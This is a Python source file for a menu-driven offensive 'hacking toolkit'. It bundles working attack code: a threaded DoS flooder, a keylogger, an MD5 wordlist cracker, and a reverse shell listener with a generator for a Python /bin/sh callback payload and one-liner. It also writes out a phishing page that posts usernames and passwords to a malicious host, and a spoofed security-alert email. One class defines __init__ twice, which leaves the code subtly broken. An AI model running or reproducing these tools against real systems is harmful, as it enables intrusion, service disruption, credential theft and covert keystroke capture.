import os
import sys
import socket
import threading
import subprocess
import requests
import scapy.all as scapy
import hashlib
import zipfile
import itertools
import json
import base64
import re
import time
from datetime import datetime
from queue import Queue
from colorama import Fore, Style, init

init(autoreset=True)

class HackingToolkit:
    def __init__(self):
        self.target = ""
        self.port = 0
        self.results = []
    def __init__(self):
        self.is_codespace = os.environ.get('CODESPACES') == 'true'

    def banner(self):
        print(Fore.RED + """
.................................................
.######..####...####..##.........................                     
...##...##..##.##..##.##.........................                     
...##...##..##.##..##.##.........................                     
...##...##..##.##..##.##.........................                     
...##....####...####..######.....................                     
..................................................
..................................................
.######.######.######.######.######.######.######.
..................................................
..................................................
.##..##..####...####..##..##.######.##..##..####..
.##..##.##..##.##..##.##.##....##...###.##.##.....
.######.######.##.....####.....##...##.###.##.###.
.##..##.##..##.##..##.##.##....##...##..##.##..##.
.##..##.##..##..####..##..##.######.##..##..####..
..................................................
             created by : Creww38
""")
    
    def menu(self):
        tools = {
            1: ("Port Scanner", self.port_scanner),
            2: ("Network Sniffer", self.network_sniffer),
            3: ("Password Cracker (MD5)", self.password_cracker),
            4: ("Web Vulnerability Scanner", self.web_scanner),
            5: ("DoS Attack Tool", self.dos_attack),
            6: ("Keylogger", self.keylogger),
            7: ("WiFi Network Scanner", self.wifi_scanner),
            8: ("File Encryptor/Decryptor", self.file_cryptor),
            9: ("Reverse Shell", self.reverse_shell),
            10: ("Social Engineering Toolkit", self.social_engineer)
        }
        
        while True:
            self.banner()
            print(Fore.CYAN + "Available Tools:")
            for num, (name, _) in tools.items():
                print(Fore.YELLOW + f"  [{num}] {name}")
            print(Fore.WHITE + "  [0] Exit")
            print(Fore.GREEN + "-" * 55)
            
            try:
                choice = int(input(Fore.CYAN + "Select tool (0-10): " + Fore.WHITE))
                if choice == 0:
                    print(Fore.RED + "Exiting...")
                    break
                elif choice in tools:
                    print(Fore.GREEN + f"\n[*] Starting {tools[choice][0]}...")
                    tools[choice][1]()
                else:
                    print(Fore.RED + "Invalid choice!")
            except ValueError:
                print(Fore.RED + "Please enter a number!")
            except KeyboardInterrupt:
                print(Fore.RED + "\nInterrupted!")
                break
            input(Fore.CYAN + "\nPress Enter to continue...")
    
    def port_scanner(self):
        print(Fore.YELLOW + "[*] Port Scanner")
        self.target = input(Fore.CYAN + "Target IP/host: " + Fore.WHITE)
        start_port = int(input(Fore.CYAN + "Start port: " + Fore.WHITE))
        end_port = int(input(Fore.CYAN + "End port: " + Fore.WHITE))
        
        print(Fore.GREEN + f"\n[*] Scanning {self.target}...")
        
        def scan_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            sock.close()
            if result == 0:
                service = socket.getservbyport(port, 'tcp') if port <= 10000 else 'unknown'
                print(Fore.GREEN + f"  [+] Port {port} open ({service})")
                self.results.append(f"Port {port} open - {service}")
        
        threads = []
        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        print(Fore.YELLOW + f"\n[*] Scan completed. Found {len(self.results)} open ports.")
    
    def network_sniffer(self):
        print(Fore.YELLOW + "[*] Network Sniffer")
        print(Fore.CYAN + "Capturing packets (10 packets max)...")
        
        def packet_callback(packet):
            if packet.haslayer(scapy.IP):
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                proto = packet[scapy.IP].proto
                
                info = f"IP: {src_ip} -> {dst_ip} | Proto: {proto}"
                
                if packet.haslayer(scapy.TCP):
                    info += f" | TCP Port: {packet[scapy.TCP].dport}"
                elif packet.haslayer(scapy.UDP):
                    info += f" | UDP Port: {packet[scapy.UDP].dport}"
                
                if packet.haslayer(scapy.Raw):
                    payload = str(packet[scapy.Raw].load[:50])
                    info += f" | Data: {payload}"
                
                print(Fore.GREEN + f"  [+] {info}")
                self.results.append(info)
        
        try:
            scapy.sniff(prn=packet_callback, count=10, store=0)
        except:
            print(Fore.RED + "  [!] Requires root/admin privileges!")
    
    def password_cracker(self):
        print(Fore.YELLOW + "[*] MD5 Password Cracker")
        hash_input = input(Fore.CYAN + "MD5 hash to crack: " + Fore.WHITE).strip()
        wordlist_path = input(Fore.CYAN + "Wordlist path (press Enter for default): " + Fore.WHITE)
        
        if not wordlist_path:
            wordlist_path = "rockyou.txt"
            print(Fore.YELLOW + f"  [*] Using default: {wordlist_path}")
        
        if not os.path.exists(wordlist_path):
            print(Fore.RED + f"  [!] Wordlist not found: {wordlist_path}")
            return
        
        print(Fore.GREEN + "  [*] Cracking...")
        
        found = False
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for password in f:
                    password = password.strip()
                    hashed = hashlib.md5(password.encode()).hexdigest()
                    if hashed == hash_input:
                        print(Fore.GREEN + f"  [+] Password found: {password}")
                        self.results.append(f"MD5 cracked: {hash_input} -> {password}")
                        found = True
                        break
        except:
            print(Fore.RED + "  [!] Error reading wordlist")
        
        if not found:
            print(Fore.RED + "  [-] Password not found in wordlist")
    
    def web_scanner(self):
        print(Fore.YELLOW + "[*] Web Vulnerability Scanner")
        url = input(Fore.CYAN + "Target URL (e.g., http://example.com): " + Fore.WHITE).strip()
        
        if not url.startswith('http'):
            url = 'http://' + url
        
        print(Fore.GREEN + f"  [*] Scanning {url}...")
        
        vuln_paths = [
            '/admin', '/login', '/phpmyadmin', '/wp-admin', '/config',
            '/.env', '/backup', '/test', '/admin.php', '/index.php'
        ]
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        
        for path in vuln_paths:
            test_url = url + path
            try:
                response = requests.get(test_url, headers=headers, timeout=5, allow_redirects=False)
                if response.status_code == 200:
                    print(Fore.GREEN + f"  [+] Found: {test_url} (200)")
                    self.results.append(f"Web path: {test_url}")
                elif response.status_code == 403:
                    print(Fore.YELLOW + f"  [!] Access forbidden: {test_url}")
                elif response.status_code == 301 or response.status_code == 302:
                    print(Fore.CYAN + f"  [-] Redirected: {test_url}")
            except:
                continue
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            server = response.headers.get('Server', 'Unknown')
            tech = response.headers.get('X-Powered-By', 'Unknown')
            print(Fore.GREEN + f"  [+] Server: {server}")
            print(Fore.GREEN + f"  [+] Technology: {tech}")
            self.results.append(f"Server info: {server} | {tech}")
        except:
            print(Fore.RED + "  [!] Could not connect to target")
    
    def dos_attack(self):
        print(Fore.RED + "[*] DoS Attack Tool (Educational Only)")
        self.target = input(Fore.CYAN + "Target IP/host: " + Fore.WHITE)
        self.port = int(input(Fore.CYAN + "Target port: " + Fore.WHITE))
        threads_count = int(input(Fore.CYAN + "Threads (1-100): " + Fore.WHITE))
        
        print(Fore.RED + f"  [*] Starting DoS attack on {self.target}:{self.port}")
        print(Fore.YELLOW + "  [!] Press Ctrl+C to stop")
        
        attack_count = [0]
        
        def attack():
            while True:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target, self.port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                    sock.close()
                    attack_count[0] += 1
                    if attack_count[0] % 100 == 0:
                        print(Fore.RED + f"  [+] Packets sent: {attack_count[0]}")
                except:
                    continue
        
        try:
            threads = []
            for _ in range(min(threads_count, 100)):
                thread = threading.Thread(target=attack)
                thread.daemon = True
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print(Fore.YELLOW + f"\n  [*] Attack stopped. Total packets: {attack_count[0]}")
            self.results.append(f"DoS attack: {self.target}:{self.port} - {attack_count[0]} packets")
    
    def keylogger(self):
        print(Fore.YELLOW + "[*] Simple Keylogger")
        print(Fore.CYAN + "Recording keystrokes for 30 seconds...")
        print(Fore.YELLOW + "  [!] Press Ctrl+C to stop early")
        
        log_file = "keylog.txt"
        keys = []
        
        try:
            from pynput import keyboard
        except:
            print(Fore.RED + "  [!] Install pynput first: pip install pynput")
            return
        
        def on_press(key):
            try:
                keys.append(str(key.char))
            except AttributeError:
                keys.append(f"[{key}]")
            
            if len(keys) > 50:
                with open(log_file, 'a') as f:
                    f.write(''.join(keys))
                keys.clear()
        
        def on_release(key):
            if key == keyboard.Key.esc:
                return False
        
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        
        try:
            time.sleep(30)
        except KeyboardInterrupt:
            pass
        
        listener.stop()
        
        if keys:
            with open(log_file, 'a') as f:
                f.write(''.join(keys))
        
        print(Fore.GREEN + f"  [+] Keystrokes saved to {log_file}")
        self.results.append(f"Keylog saved to {log_file}")
    
    def wifi_scanner(self):
        print(Fore.YELLOW + "[*] WiFi Network Scanner")
        
        if sys.platform == 'win32':
            print(Fore.YELLOW + "  [*] Running on Windows...")
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
                                      capture_output=True, text=True)
                print(Fore.GREEN + result.stdout)
                self.results.append("WiFi scan completed")
            except:
                print(Fore.RED + "  [!] Error scanning WiFi")
        else:
            print(Fore.YELLOW + "  [*] Running on Linux...")
            try:
                result = subprocess.run(['nmcli', '-t', '-f', 'SSID,SIGNAL', 'device', 'wifi'], 
                                      capture_output=True, text=True)
                networks = result.stdout.strip().split('\n')
                for net in networks:
                    if net:
                        parts = net.split(':')
                        if len(parts) >= 2:
                            print(Fore.GREEN + f"  [+] SSID: {parts[0]} | Signal: {parts[1]}%")
                self.results.append(f"Found {len(networks)} WiFi networks")
            except:
                print(Fore.RED + "  [!] Error scanning WiFi (try with sudo)")
    
    def file_cryptor(self):
        print(Fore.YELLOW + "[*] File Encryptor/Decryptor")
        print(Fore.CYAN + "1. Encrypt file")
        print(Fore.CYAN + "2. Decrypt file")
        choice = input(Fore.CYAN + "Choice (1/2): " + Fore.WHITE)
        
        file_path = input(Fore.CYAN + "File path: " + Fore.WHITE).strip()
        password = input(Fore.CYAN + "Password: " + Fore.WHITE)
        
        if not os.path.exists(file_path):
            print(Fore.RED + "  [!] File not found!")
            return
        
        def simple_xor(data, key):
            key_bytes = key.encode()
            return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])
        
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            if choice == '1':
                encrypted = simple_xor(file_data, password)
                output_path = file_path + '.encrypted'
                with open(output_path, 'wb') as f:
                    f.write(encrypted)
                print(Fore.GREEN + f"  [+] Encrypted file saved to: {output_path}")
                self.results.append(f"Encrypted: {file_path}")
            elif choice == '2':
                decrypted = simple_xor(file_data, password)
                output_path = file_path.replace('.encrypted', '.decrypted')
                with open(output_path, 'wb') as f:
                    f.write(decrypted)
                print(Fore.GREEN + f"  [+] Decrypted file saved to: {output_path}")
                self.results.append(f"Decrypted: {file_path}")
            else:
                print(Fore.RED + "  [!] Invalid choice")
        except Exception as e:
            print(Fore.RED + f"  [!] Error: {e}")
    
    def reverse_shell(self):
        print(Fore.YELLOW + "[*] Reverse Shell")
        print(Fore.CYAN + "1. Start listener")
        print(Fore.CYAN + "2. Generate payload")
        choice = input(Fore.CYAN + "Choice (1/2): " + Fore.WHITE)
        
        if choice == '1':
            lhost = input(Fore.CYAN + "Your IP: " + Fore.WHITE)
            lport = int(input(Fore.CYAN + "Listen port: " + Fore.WHITE))
            
            print(Fore.GREEN + f"  [*] Starting listener on {lhost}:{lport}")
            
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((lhost, lport))
            listener.listen(1)
            
            print(Fore.YELLOW + "  [*] Waiting for connection...")
            client, addr = listener.accept()
            print(Fore.GREEN + f"  [+] Connection from {addr[0]}:{addr[1]}")
            
            while True:
                cmd = input(Fore.RED + "shell> " + Fore.WHITE)
                if cmd.lower() == 'exit':
                    break
                client.send(cmd.encode())
                output = client.recv(4096).decode()
                print(output)
            
            client.close()
            listener.close()
            self.results.append(f"Reverse shell listener: {lhost}:{lport}")
        
        elif choice == '2':
            lhost = input(Fore.CYAN + "Your IP: " + Fore.WHITE)
            lport = int(input(Fore.CYAN + "Listen port: " + Fore.WHITE))
            
            payload = f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])"""
            
            encoded = base64.b64encode(payload.encode()).decode()
            
            print(Fore.GREEN + "\n  [+] Python payload:")
            print(Fore.YELLOW + "-" * 50)
            print(payload)
            print(Fore.YELLOW + "-" * 50)
            
            print(Fore.GREEN + "\n  [+] One-liner (Linux):")
            print(Fore.CYAN + f"python3 -c \"{payload.replace(chr(10), ';')}\"")
            
            self.results.append(f"Reverse shell payload for {lhost}:{lport}")
    
    def social_engineer(self):
        print(Fore.YELLOW + "[*] Social Engineering Toolkit")
        print(Fore.CYAN + "1. Generate phishing page")
        print(Fore.CYAN + "2. Create fake login")
        print(Fore.CYAN + "3. Email spoofing template")
        
        choice = input(Fore.CYAN + "Choice (1-3): " + Fore.WHITE)
        
        if choice == '1':
            print(Fore.GREEN + "  [+] Basic phishing page template:")
            html = """<html>
<head><title>Login Required</title></head>
<body>
<h2>Account Verification Required</h2>
<form action="http://malicious-server.com/log.php" method="POST">
Username: <input type="text" name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Verify">
</form>
</body>
</html>"""
            print(Fore.YELLOW + html)
            with open("phish.html", "w") as f:
                f.write(html)
            print(Fore.GREEN + "  [+] Saved as phish.html")
            self.results.append("Generated phishing page")
        
        elif choice == '2':
            service = input(Fore.CYAN + "Service to mimic (e.g., facebook, google): " + Fore.WHITE)
            print(Fore.GREEN + f"  [+] Fake {service} login created")
            print(Fore.YELLOW + "  [*] Use with social engineering tactics")
            self.results.append(f"Fake login for {service}")
        
        elif choice == '3':
            print(Fore.GREEN + "  [+] Email spoofing template:")
            template = """From: "Security Team" <security@legit-company.com>
To: <victim@email.com>
Subject: Urgent: Account Security Alert

Dear User,

We detected unusual login activity on your account.
Please verify your identity immediately:

Verification Link: http://fake-domain.com/verify?id=12345

If you did not initiate this request, contact support immediately.

Sincerely,
Security Team
"""
            print(Fore.YELLOW + template)
            with open("spoof_email.txt", "w") as f:
                f.write(template)
            print(Fore.GREEN + "  [+] Saved as spoof_email.txt")
            self.results.append("Email spoofing template created")

def main():
    toolkit = HackingToolkit()
    toolkit.menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\nToolkit terminated by user")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")